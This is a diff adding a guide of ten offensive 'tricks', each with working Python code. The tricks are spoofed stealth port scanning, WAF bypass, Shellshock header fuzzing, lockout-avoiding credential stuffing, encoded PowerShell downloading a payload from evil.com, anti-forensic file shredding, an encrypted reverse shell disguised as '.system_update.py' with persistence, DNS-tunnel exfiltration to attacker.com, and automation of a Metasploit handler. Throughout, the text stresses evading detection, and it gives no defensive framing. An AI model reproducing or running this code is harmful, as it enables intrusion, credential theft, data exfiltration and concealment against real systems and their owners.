@@ -1,0 +1,198 @@
+1. Stealthy Port Scanner (SYN Scan with Scapy)
+Standard nmap is detectable. A custom SYN scanner with random source IPs, slow timing, and no full TCP handshake blends in.
+
+python
+from scapy.all import *
+import random
+import time
+
+def stealth_syn_scan(target_ip, ports):
+    for port in ports:
+        src_ip = f"192.168.{random.randint(1,255)}.{random.randint(1,255)}" 
+        pkt = IP(src=src_ip, dst=target_ip) / TCP(dport=port, flags="S")  # SYN only
+        send(pkt, verbose=False)
+        time.sleep(random.uniform(0.5, 1.5))  # slow down
+        # Do not wait for reply – hide your real IP
+Trick: Use random source IPs (spoofing) – only works on networks without ingress filtering. Combine with time.sleep to avoid burst detection.
+
+2. WAF / Cloudflare Bypass (Headless Browser + Rotating Proxies)
+Most WAFs block scans but allow real browsers. Use Python + Playwright + rotating proxies.
+
+python
+from playwright.sync_api import sync_playwright
+import random
+
+proxies = ["http://proxy1:8080", "http://proxy2:8080"]  # need valid proxy list
+
+def bypass_waf(url):
+    proxy = random.choice(proxies)
+    with sync_playwright() as p:
+        browser = p.chromium.launch(headless=True, proxy={"server": proxy})
+        context = browser.new_context(
+            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) ...",
+            viewport={"width": 390, "height": 844}
+        )
+        page = context.new_page()
+        page.goto(url)
+        # Extract content even if WAF would block normal requests
+        return page.content()
+Trick: Each request comes from a different IP and looks like a real mobile browser.
+
+3. HTTP Header Fuzzing (To Detect WAF, Server, or Hidden Endpoints)
+Custom dictionary of odd and malicious headers to bypass filters.
+
+python
+import requests
+
+headers_list = [
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Originating-IP": "127.0.0.1"},
+    {"User-Agent": "() { :; }; /bin/bash -c 'ping google.com'"}  # Shellshock test
+]
+
+for headers in headers_list:
+    r = requests.get("https://target.com/admin", headers=headers, timeout=2)
+    if r.status_code == 200:
+        print(f"Bypassed with: {headers}")
+Trick: Many WAF rules only check standard headers – adding X-Forwarded-For can trick IP‑based blocks.
+
+4. Credential Stuffing with Throttling & CAPTCHA Detection
+Avoid lockouts by using exponential backoff and checking for CAPTCHA responses.
+
+python
+import time
+import requests
+
+def brute_force_login(url, user, passwords):
+    for i, pwd in enumerate(passwords):
+        r = requests.post(url, data={"username": user, "password": pwd})
+        if "captcha" in r.text.lower():
+            print("CAPTCHA detected – stop or solve manually")
+            break
+        if "invalid password" not in r.text.lower():
+            print(f"Found password: {pwd}")
+            break
+        time.sleep(2 ** i)  # exponential delay
+Trick: Gradually increase the delay between attempts to look like a human failing to remember a password.
+
+5. PowerShell Payload Obfuscation (For Post‑Exploitation)
+Encode commands in multiple layers of Base64, then invoke from Python.
+
+python
+import base64
+
+def obfuscate_powershell(command):
+    # Encode as UTF‑16LE then Base64
+    encoded = base64.b64encode(command.encode('utf-16le')).decode()
+    return f"powershell -EncodedCommand {encoded}"
+
+cmd = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+print(obfuscate_powershell(cmd))
+Trick: Windows Defender sees plain PowerShell but often misses encoded versions. Add random comments or split strings.
+
+6. File Shredding (Anti‑Forensics)
+Overwrite a file multiple times to make recovery impossible.
+
+python
+import os
+
+def shred_file(path, passes=3):
+    with open(path, 'r+b') as f:
+        length = os.path.getsize(path)
+        for _ in range(passes):
+            f.seek(0)
+            f.write(os.urandom(length))   # random data
+    os.remove(path)
+Trick: Even after deletion, forensic tools can recover data – overwriting first prevents that.
+
+7. Reverse Shell with Encrypted Payload & Persistence
+Use Python + AES encryption to hide the reverse shell command in a seemingly innocuous script.
+
+python
+from cryptography.fernet import Fernet
+import base64
+
+key = Fernet.generate_key()
+cipher = Fernet(key)
+# Instead of plain text, embed encrypted shell command:
+encrypted = cipher.encrypt(b"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
+script = f"""
+import base64, cryptography.fernet
+key = {key!r}
+cipher = cryptography.fernet.Fernet(key)
+exec(cipher.decrypt({encrypted!r}))
+"""
+with open(".system_update.py", "w") as f:
+    f.write(script)
+Trick: The script looks like an innocent update. Then add to cron or registry for persistence.
+
+8. DNS Tunneling (Exfiltration Without Firewall Detection)
+Send data out over DNS queries – firewalls don’t block DNS.
+
+python
+import dns.resolver
+import base64
+
+def exfiltrate_dns(data, domain="attacker.com"):
+    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
+    for chunk in chunks:
+        subdomain = base64.b64encode(chunk.encode()).decode().replace("=", "") + "." + domain
+        try:
+            dns.resolver.resolve(subdomain, "A")  # even if it fails, query is sent
+        except:
+            pass
+Trick: Append data as subdomains of your controlled domain – the DNS server logs the full query. Extremely stealthy.
+
+9. Swarm / Distributed Scanning (Hide Origin)
+Use multiple VPS workers with Python + asyncio to scan a target from hundreds of IPs.
+
+python
+import asyncio
+import aiohttp
+
+async def scan_port(ip, port):
+    connector = aiohttp.TCPConnector(limit=100)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        try:
+            async with session.get(f"http://{ip}:{port}", timeout=1) as resp:
+                print(f"Port {port} open")
+        except:
+            pass
+
+async def main():
+    tasks = [scan_port("target.com", p) for p in range(1, 1000)]
+    await asyncio.gather(*tasks)
+asyncio.run(main())
+Trick: Run on 20+ cheap VPSs simultaneously – the target sees a DDoS‑like scan, not a single attacker.
+
+10. Automated Metasploit Resource Files (No Manual Commands)
+Generate a .rc file and launch msfconsole programmatically.
+
+python
+import subprocess
+
+def metasploit_auto(target_ip):
+    rc_content = f"""
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST {target_ip}
+set LPORT 4444
+exploit -j
+"""
+    with open("/tmp/auto.rc", "w") as f:
+        f.write(rc_content)
+    subprocess.run(["msfconsole", "-q", "-r", "/tmp/auto.rc"])
+Trick: Save hours by scripting configurable Metasploit attacks.
+
+Summary Table – Python Cheater Tricks
+Trick	Python Library	Primary Use
+SYN stealth port scan	scapy	Bypass IDS
+Headless browser bypass	playwright	WAF/Cloudflare
+Header fuzzing	requests	Web app testing
+Throttled brute force	requests + time	Credential attacks (avoid lockouts)
+PowerShell obfuscation	base64	Post‑exploitation stealth
+File shredding	os	Anti‑forensics
+Encrypted reverse shell	cryptography	Persistence
+DNS tunneling	dnspython	Exfiltration
+Distributed scanning	aiohttp + asyncio	Mask origin IP
+Metasploit automation	subprocess	Fast payload deployment
